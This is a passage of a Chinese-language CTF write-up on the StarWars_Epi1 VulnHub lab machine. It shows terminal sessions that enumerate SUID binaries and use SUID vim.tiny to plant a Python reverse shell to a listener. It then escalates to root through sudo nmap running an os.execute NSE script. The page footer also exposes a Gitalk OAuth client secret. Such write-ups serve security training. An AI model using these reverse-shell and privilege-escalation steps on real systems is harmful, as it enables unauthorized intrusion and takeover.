<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/home/skywalker$ <span class="hljs-built_in">cd</span> .secrets/<br>han@starwars:/home/skywalker/.secrets$ <span class="hljs-built_in">ls</span> -laih<br>total 12K<br>43115 drwxr-xr-x 2 skywalker skywalker 4.0K Jul 24  2020 .<br>37181 drwxr-xr-x 5 skywalker skywalker 4.0K Jul 24  2020 ..<br>39574 -rw-r----- 1 skywalker skywalker   50 Jul 24  2020 note.txt<br>han@starwars:/home/skywalker/.secrets$ <span class="hljs-built_in">cat</span> note.txt <br><span class="hljs-built_in">cat</span>: note.txt: Permission denied<br></code></pre></td></tr></table></figure>

<p>没有读取权限，再去看看网站根目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/tmp$ <span class="hljs-built_in">cd</span> /var/www/html<br>han@starwars:/var/www/html$ <span class="hljs-built_in">ls</span><br>admin  images  index.html  r2d2  robots.txt  users.js  wordpress<br>han@starwars:/var/www/html$ <span class="hljs-built_in">cd</span> wordpress<br>-bash: <span class="hljs-built_in">cd</span>: wordpress: Not a directory<br>han@starwars:/var/www/html$ <span class="hljs-built_in">ls</span> -alih<br>total 36K<br> 8085 drwxr-xr-x 3 root root 4.0K Jul 25  2020 .<br> 8084 drwxr-xr-x 3 root root 4.0K Jul 20  2020 ..<br>37079 -rw-r--r-- 1 root root 3.7K Jul 23  2020 admin<br>36973 drwxr-xr-x 2 root root 4.0K Jul 23  2020 images<br>36309 -rw-r--r-- 1 root root  548 Jul 23  2020 index.html<br>42292 -rw-r--r-- 1 root root 3.3K Jul 23  2020 r2d2<br>39330 -rw-r--r-- 1 root root  105 Jul 23  2020 robots.txt<br>41183 -rw-r--r-- 1 root root   16 Jul 23  2020 users.js<br>41060 -rw-r--r-- 1 root root   54 Jul 23  2020 wordpress<br></code></pre></td></tr></table></figure>

<p>查看 SUID 和定时任务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/var$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   147279    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>   143107     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   390885     16 -rwsr-sr-x   1 root     root          14608 Mar  5  2019 /usr/lib/xorg/Xorg.wrap<br>   264227     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   143141     20 -rwsr-xr-x   1 root     root          18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   129321     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd<br>   129319     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh<br>   132702     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp<br>   133176     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount<br>   143139     24 -rwsr-xr-x   1 root     root          23288 Jan 15  2019 /usr/bin/pkexec<br>   156384     56 -rwsr-xr-x   1 root     root          55400 Mar  6  2019 /usr/bin/bwrap<br>   132849     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su<br>   136952   1176 -rwsrwsrwx   1 root     root        1200696 Jun 15  2019 /usr/bin/vim.tiny<br>   143296     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount<br>   176421   2844 -rwsr-xr-x   1 root     root        2911160 Dec 12  2018 /usr/bin/nmap<br>   133174     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount<br>   129322     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd<br>   129318     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn<br>   143313    152 -rwsr-xr-x   1 root     root         154352 Mar 21  2019 /usr/bin/ntfs-3g<br>   173131    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo<br>   172781    380 -rwsr-xr--   1 root     dip          386792 Feb 20  2020 /usr/sbin/pppd<br><br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure>

<p>SUID 中 vim.tiny 和 nmap 或许有可以利用的地方</p>
<p><img src="/pic/fe68030205a468a1bf3149444e76e84b_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>或许可以用于读取，写入一些原本没有读写权限的文件</p>
<h2 id="SUID-VIM-读写定时脚本反弹-shell"><a href="#SUID-VIM-读写定时脚本反弹-shell" class="headerlink" title="SUID VIM 读写定时脚本反弹 shell"></a>SUID VIM 读写定时脚本反弹 shell</h2><p>尝试修改 evil.py</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.106&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span> &gt; evil.py<br>-bash: evil.py: Permission denied<br>han@starwars:/home/Darth/.secrets$ vim.tiny evil.py  <br>han@starwars:/home/Darth/.secrets$ <span class="hljs-built_in">cat</span> evil.py <br>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="hljs-number">192.168</span>.<span class="hljs-number">56.106</span>&quot;,<span class="hljs-number">443</span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="hljs-string">&quot;sh&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>提前开启监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/StarWars_Epi1_CTF]<br>└─$ sudo nc -lvnp 443                             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.147] 37906<br>$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>Darth<br>$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1002(Darth) gid=1002(Darth) <span class="hljs-built_in">groups</span>=1002(Darth),27(sudo),2000(anakin)<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span> <br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>Darth@starwars:~$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 44K<br>43137 drwxr-xr-x 5 Darth Darth 4.0K Jul 24  2020 .<br>  193 drwxr-xr-x 5 root  root  4.0K Jul 23  2020 ..<br>43125 -rw------- 1 Darth Darth 2.3K Jul 24  2020 .bash_history<br>43304 -rw-r--r-- 1 Darth Darth  220 Apr 18  2019 .bash_logout<br>43303 -rw-r--r-- 1 Darth Darth 3.5K Apr 18  2019 .bashrc<br>43305 drwx------ 3 Darth Darth 4.0K Jul 23  2020 .gnupg<br> 1419 -rw------- 1 Darth Darth   42 Jul 24  2020 .lesshst<br> 1415 drwxr-xr-x 3 Darth Darth 4.0K Jul 24  2020 .<span class="hljs-built_in">local</span><br>43302 -rw-r--r-- 1 Darth Darth  807 Apr 18  2019 .profile<br> 1420 drwxr-xr-x 2 Darth Darth 4.0K Oct  2 09:26 .secrets<br> 1414 -rw-r--r-- 1 Darth Darth   66 Jul 24  2020 .selected_editor<br>Darth@starwars:~$ sudo -l       <br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> Darth on starwars:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User Darth may run the following commands on starwars:<br>    (ALL) NOPASSWD: /usr/bin/nmap<br></code></pre></td></tr></table></figure>

<h2 id="sudo-nmap-提权"><a href="#sudo-nmap-提权" class="headerlink" title="sudo nmap 提权"></a>sudo nmap 提权</h2><p>借助 gtfobins 来查看提权手法，<code>--interactive</code> 参数由于版本问题，不支持，因此使用运行可控的 nmap 脚本来提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Darth@starwars:~$ sudo /usr/bin/nmap --interactive<br>sudo /usr/bin/nmap --interactive<br>/usr/bin/nmap: unrecognized option <span class="hljs-string">&#x27;--interactive&#x27;</span><br>See the output of nmap -h <span class="hljs-keyword">for</span> a summary of options.<br>Darth@starwars:~$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>Darth@starwars:/tmp$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>pulse-PKdhtXMmr18n<br>systemd-private-88d98199aeff4b95840bfa9330947e54-apache2.service-v542CT<br>systemd-private-88d98199aeff4b95840bfa9330947e54-ModemManager.service-HniTNs<br>systemd-private-88d98199aeff4b95840bfa9330947e54-systemd-timesyncd.service-K1oC4C<br>Darth@starwars:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-built_in">test</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-built_in">test</span><br>Darth@starwars:/tmp$ sudo /usr/bin/nmap --script=<span class="hljs-built_in">test</span><br>sudo /usr/bin/nmap --script=<span class="hljs-built_in">test</span><br>Starting Nmap 7.70 ( https://nmap.org ) at 2023-10-02 09:29 EDT<br>NSE: Warning: Loading <span class="hljs-string">&#x27;test&#x27;</span> -- the recommended file extension is <span class="hljs-string">&#x27;.nse&#x27;</span>.<br><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>

<p>寻找flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:83:80:40 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.147/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3<br>       valid_lft 364sec preferred_lft 364sec<br>    inet6 fe80::a00:27ff:fe83:8040/64 scope <span class="hljs-built_in">link</span> noprefixroute <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br>Linux starwars 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls -liah</span><br>total 376K<br>  195 drwx------ 16 root root 4.0K Jul 25  2020 .<br>    2 drwxr-xr-x 19 root root 4.0K Jul 20  2020 ..<br> 1258 -rw-------  1 root root 4.4K Jul 24  2020 .bash_history<br>  247 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc<br>  142 drwx------  6 root root 4.0K Jul 22  2020 .cache<br>  175 drwxr-xr-x  7 root root 4.0K Jul 23  2020 .config<br>  209 drwxr-xr-x  2 root root 4.0K Jul 23  2020 Desktop<br>  148 -rw-r--r--  1 root root   35 Jul 20  2020 .dmrc<br>  258 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Documents<br>  210 drwxr-xr-x  2 root root 4.0K Jul 22  2020 Downloads<br>37235 -rw-r--r--  1 root root  793 Jul 23  2020 flag.txt<br>  171 drwx------  3 root root 4.0K Jul 20  2020 .gnupg<br> 1438 -rw-------  1 root root 2.6K Jul 25  2020 .ICEauthority<br>  404 drwxr-xr-x  3 root root 4.0K Jul 20  2020 .<span class="hljs-built_in">local</span><br> 1250 drwx------  5 root root 4.0K Jul 22  2020 .mozilla<br>  265 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Music<br> 1273 -rw-r--r--  1 root root 240K Jul 24  2020 nmap-4.53.tar.bz2.2<br>  297 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Pictures<br>  246 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>  254 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Public<br>36714 drwx------  2 root root 4.0K Jul 22  2020 .ssh<br>  212 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Templates<br>  308 drwxr-xr-x  2 root root 4.0K Jul 20  2020 Videos<br>  173 -rw-------  1 root root   53 Jul 25  2020 .Xauthority<br>  518 -rw-r--r--  1 root root  11K Jul 25  2020 .xfce4-session.verbose-log<br>  474 -rw-r--r--  1 root root  19K Jul 24  2020 .xfce4-session.verbose-log.last<br> 1271 -rw-------  1 root root 3.0K Jul 25  2020 .xsession-errors<br>  174 -rw-------  1 root root 3.4K Jul 24  2020 .xsession-errors.old<br><span class="hljs-comment"># cat flag.txt</span><br>    .-.<br>                      |_:_|<br>                     /(_Y_)\<br>.                   ( \/M\/ )<br> <span class="hljs-string">&#x27;.               _.&#x27;</span>-/<span class="hljs-string">&#x27;-&#x27;</span>\-<span class="hljs-string">&#x27;._</span><br><span class="hljs-string">   &#x27;</span>:           _/.--<span class="hljs-string">&#x27;[[[[]&#x27;</span>--.\_<br>     <span class="hljs-string">&#x27;:        /_&#x27;</span>  : |::<span class="hljs-string">&quot;| :  &#x27;.\</span><br><span class="hljs-string">       &#x27;:     //   ./ |oUU| \.&#x27;  :\</span><br><span class="hljs-string">         &#x27;:  _:&#x27;..&#x27; \_|___|_/ :   :|</span><br><span class="hljs-string">           &#x27;:.  .&#x27;  |_[___]_|  :.&#x27;:\</span><br><span class="hljs-string">            [::\ |  :  | |  :   ; : \</span><br><span class="hljs-string">             &#x27;-&#x27;   \/&#x27;.| |.&#x27; \  .;.&#x27; |</span><br><span class="hljs-string">             |\_    \  &#x27;-&#x27;   :       |</span><br><span class="hljs-string">             |  \    \ .:    :   |   |</span><br><span class="hljs-string">             |   \    | &#x27;.   :    \  |</span><br><span class="hljs-string">             /       \   :. .;       |</span><br><span class="hljs-string">            /     |   |  :__/     :  \\</span><br><span class="hljs-string">           |  |   |    \:   | \   |   ||</span><br><span class="hljs-string">          /    \  : :  |:   /  |__|   /|</span><br><span class="hljs-string">      snd |     : : :_/_|  /&#x27;._\  &#x27;--|_\</span><br><span class="hljs-string">          /___.-/_|-&#x27;   \  \</span><br><span class="hljs-string">                         &#x27;-&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">I hope you liked it Padawan :)</span><br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
  
  
    <span>></span>
    
  <a href="/categories/knowledge-database/vulnhub/" class="category-chain-item">vulnhub</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>StarWars_Epi1_CTF靶机</div>
      <div>https://i3eg1nner.github.io/2023/09/177299db5791.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>I3eg1nner</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年9月30日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/10/2756aae2067b.html" title="Analytics">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Analytics</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/0986fb84a8d0.html" title="Quaoar 靶机">
                        <span class="hidden-mobile">Quaoar 靶机</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: 'aac5994c84e58d5915163ad7333331c2'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
